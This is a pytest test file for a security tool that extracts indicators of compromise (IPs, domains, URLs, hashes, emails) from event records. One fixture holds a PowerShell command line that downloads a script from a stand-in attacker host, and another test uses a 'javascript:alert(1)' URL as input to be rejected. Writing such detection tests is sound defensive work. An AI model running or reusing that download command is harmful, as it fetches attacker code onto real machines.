import time

import pytest

from app.investigations import iocs


def vals(doc):
    return {(c.type, c.value) for c in iocs.extract(doc)}


def test_extracts_direct_fields_and_skips_internal_addresses():
    doc = {
        "network": {"dst_ip": "203.0.113.45", "src_ip": "10.1.2.3", "dst_domain": "Evil.Example."},
        "dns": {"question": "cdn-update-check.example", "answers": ["203.0.113.45", "192.168.1.1", "alias.example"]},
        "process": {"hash": {"sha256": "A" * 64, "md5": "b" * 32}},
        "file": {"hash": {"sha1": "c" * 40}},
        "auth": {"source_ip": "198.51.100.23"},
    }
    assert vals(doc) == {
        ("ip", "203.0.113.45"),
        ("domain", "evil.example"),
        ("domain", "cdn-update-check.example"),
        ("sha256", "a" * 64),
        ("md5", "b" * 32),
        ("sha1", "c" * 40),
        ("ip", "198.51.100.23"),
    }


# ruff: noqa: E501
def test_extracts_from_command_lines():
    doc = {
        "process": {
            "command_line": 'powershell -c "iwr https://dl.evil.example/a.ps1?x=1 -o a.ps1; ping 203.0.113.9" mail bob@corp.example'
        }
    }
    got = vals(doc)
    assert ("url", "https://dl.evil.example/a.ps1?x=1") in got
    assert (
        ("domain", "dl.evil.example") in got and ("ip", "203.0.113.9") in got and ("email", "bob@corp.example") in got
    )
    assert ("domain", "a.ps1") not in got


@pytest.mark.parametrize(
    "value,expected",
    [
        ("999.1.1.1", True),
        ("10.0.0.1", True),
        ("127.0.0.1", True),
        ("169.254.169.254", True),
        ("203.0.113.5", False),
        ("::1", True),
        ("fe80::1", True),
        ("2001:db8::1", False),
        ("::ffff:10.0.0.1", True),
    ],
)
def test_internal_ip_classification(value, expected):
    assert iocs.is_internal_ip(value) is expected


def test_normalize_rejects_invalid():
    assert iocs.normalize("domain", "not a domain") is None
    assert iocs.normalize("domain", "x.exe") is None
    assert iocs.normalize("sha256", "g" * 64) is None
    assert iocs.normalize("sha256", "a" * 63) is None
    assert iocs.normalize("ip", "1.2.3") is None
    assert iocs.normalize("url", "javascript:alert(1)") is None
    assert iocs.normalize("email", "a@b") is None
    assert iocs.normalize("domain", "A.Example.") == "a.example"


def test_hostile_input_is_fast_and_safe():
    start = time.perf_counter()
    doc = {
        "process": {"command_line": "http://" + "a" * 8000 + " " + "1." * 4000 + "@" * 4000 + " " + "a." * 3000},
        "message": {"not": "a string"},
        "network": {"dst_ip": ["x"], "dst_domain": 5},
        "dns": {"answers": "oops"},
    }
    iocs.extract(doc)
    assert time.perf_counter() - start < 1.0
